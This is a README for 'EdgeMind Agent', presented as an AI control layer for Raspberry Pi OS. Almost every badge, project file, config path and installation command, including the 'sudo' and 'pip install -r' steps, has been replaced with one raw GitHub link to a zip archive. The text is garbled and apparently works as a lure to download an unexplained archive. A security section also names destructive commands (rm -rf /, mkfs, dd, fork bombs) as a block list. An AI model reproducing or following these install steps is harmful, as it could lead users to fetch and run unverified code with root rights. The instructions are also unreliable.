# EdgeMind Agent 🧠

> An AI-powered intelligent control layer for Raspberry Pi OS

[![License: MIT](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)
[![Python 3.9+](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip+https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)
[![Raspberry Pi](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip%https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)](https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip)

## 🎯 What is EdgeMind Agent?

EdgeMind Agent is an AI system that operates as an **intelligent control layer** on top of Raspberry Pi OS:

- **Not part of the OS** - Runs as a separate service
- **No direct privileges** - All commands go through security gateway
- **Analysis & Planning Brain** - Thinks before acting

```
Real System     = Raspberry Pi OS
Intelligence    = Gemini API
Execution       = Security Gateway (Safe)
```

### Key Principle

> **"AI doesn't execute — AI decides"**

The AI analyzes, plans, and recommends. A security gateway validates and executes only whitelisted commands.

## 🏗️ Project Structure

```
edgemind-agent/
├── src/
│   ├── core/
│   │   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip           # Main AI agent brain
│   │   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip # System context collector
│   │   └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip # Decision processor
│   ├── gateway/
│   │   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip # Security validation layer
│   │   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip        # Allowed commands manager
│   │   └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip         # Safe command executor
│   ├── api/
│   │   └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip    # Gemini API client
│   ├── interface/
│   │   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip              # Command-line interface
│   │   └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip       # Web dashboard
│   └── utils/
│       ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip           # Logging system
│       └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip       # Input validation
├── config/
│   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip           # System configuration
│   ├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip          # Whitelisted commands
│   └── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip       # Gemini system prompt
├── logs/                       # System logs
├── tests/                      # Unit tests
├── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
└── https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
```

## 🚀 Installation

### Quick Start

```bash
# Clone the repository
git clone https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
cd edgemind-agent

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip

# Set up API key
export GEMINI_API_KEY="your-api-key"

# Run the system
python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
```

### Raspberry Pi Installation

```bash
# Use the installation script
chmod +x https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip

# Install as a systemd service (optional)
sudo https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
```

## 💻 Usage

### Interactive CLI Mode
```bash
python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip
```

### Web Dashboard Mode
```bash
python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip --web
# Access at http://localhost:8080
```

### Single Request Analysis
```bash
python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip --analyze "Check memory usage"
python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip --analyze "Why is SSH not working?" --execute
```

### Check System Status
```bash
python https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip --status
```

## 📊 Workflow

```
User Request
     ↓
EdgeMind Interface (CLI / Web)
     ↓
Context Builder (Logs / Errors / System State)
     ↓
Gemini API (AI Brain)
     ↓
Decision Output (Structured JSON)
     ↓
Security Gateway (Validation)
     ↓
Raspberry Pi OS (Execution)
```

## 🔐 Security Model

| Component | Role |
|-----------|------|
| **Gemini API** | Understands, Analyzes, Plans, Rejects dangerous requests |
| **Security Gateway** | Validates against whitelist, Blocks dangerous commands |
| **Raspberry Pi OS** | Only receives pre-approved commands |

### Risk Levels

| Level | Description | Action |
|-------|-------------|--------|
| 🟢 **Low** | Read-only commands | Auto-execute |
| 🟡 **Medium** | Service control, package management | Requires confirmation |
| 🔴 **High** | System modifications | Blocked automatically |

### Blacklisted Commands (Never Executed)

- `rm -rf /` and destructive patterns
- `mkfs`, `dd` disk operations
- `shutdown`, `reboot`, `halt`
- Firewall/routing modifications
- Fork bombs and malicious patterns

## 📋 Supported Tasks

- ✅ **System Diagnostics** - Memory, CPU, disk, temperature
- ✅ **Network Analysis** - Interfaces, ports, connectivity
- ✅ **Service Health** - Status, logs, restart recommendations
- ✅ **File Inspection** - Safe read-only file operations
- ✅ **Automation Planning** - Multi-step task planning
- ✅ **Advisory DevOps** - Best practice recommendations

## ⚙️ Configuration

### Environment Variables

| Variable | Description | Required |
|----------|-------------|----------|
| `GEMINI_API_KEY` | Google Gemini API key | Yes |
| `HOST` | Web server host | No (default: 0.0.0.0) |
| `PORT` | Web server port | No (default: 8080) |

### Config Files

- `https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip` - General settings, security options
- `https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip` - Allowed commands and risk levels
- `https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip` - AI behavior instructions

## 🧪 Testing

```bash
# Run all tests
pytest tests/ -v

# Run specific test file
pytest https://raw.githubusercontent.com/SAIFontop/edgemind-agent/main/src/core/edgemind-agent-v1.5.zip -v

# Run with coverage
pytest tests/ --cov=src
```

## 📖 API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Web dashboard |
| `/api/status` | GET | System status |
| `/api/context` | GET | Full system context |
| `/api/analyze` | POST | Analyze a request |
| `/api/execute` | POST | Execute a command |
| `/api/validate` | POST | Validate a command |
| `/api/health` | GET | Health check |

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- Google Gemini API for AI capabilities
- Raspberry Pi Foundation
- The open-source community

---

**Made with ❤️ for Raspberry Pi enthusiasts**
